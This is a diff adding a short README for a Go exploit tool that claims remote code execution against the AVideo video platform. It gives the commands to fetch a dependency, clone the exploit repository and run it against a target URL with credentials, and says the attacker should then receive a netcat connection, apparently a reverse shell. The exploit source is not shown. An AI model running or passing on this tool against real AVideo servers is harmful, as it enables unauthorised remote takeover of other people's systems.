@@ -1,0 +1,15 @@
+# AVideo3xploit.go
+
+RCE exploit for [AVideo](https://github.com/WWBN/AVideo/)
+
+```
+root@kali:~# go get github.com/fatih/color
+root@kali:~# git clone https://github.com/ahussam/AVideo3xploit.git
+root@kali:~# cd AVideo3xploit
+root@kali:~/AVideo3xploit# go run AVideo3xploit.go http://[target]/avideo/ username password
+```
+
+You should get a connection on you nc 
+
+![avideo-5](av-5.png)
+
